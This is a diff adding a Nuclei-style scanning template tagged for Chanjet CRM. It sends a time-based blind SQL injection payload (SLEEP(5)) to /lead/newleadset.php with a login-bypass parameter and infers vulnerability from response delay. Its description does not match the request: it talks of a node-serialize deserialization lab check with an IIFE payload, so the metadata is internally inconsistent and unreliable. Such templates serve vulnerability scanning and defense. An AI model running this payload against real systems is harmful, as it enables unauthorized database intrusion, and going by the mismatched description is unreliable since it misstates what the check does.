@@ -1,0 +1,24 @@
+id: changjie-crm-sqli
+
+info:
+  name: changjie 
+  author: ro1t
+  severity: critical
+  description: |
+    Local lab check for node-serialize <= 0.0.4 at /api/deserialize.
+    It sends an IIFE payload and expects the lab app to return {"ok":true}.
+  tags: 用友畅捷通CRM
+
+http:
+  - raw:
+      - |
+        @timeout: 25s
+        GET /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'duration<=7'
+          - 'status_code == 200'
+        condition: and
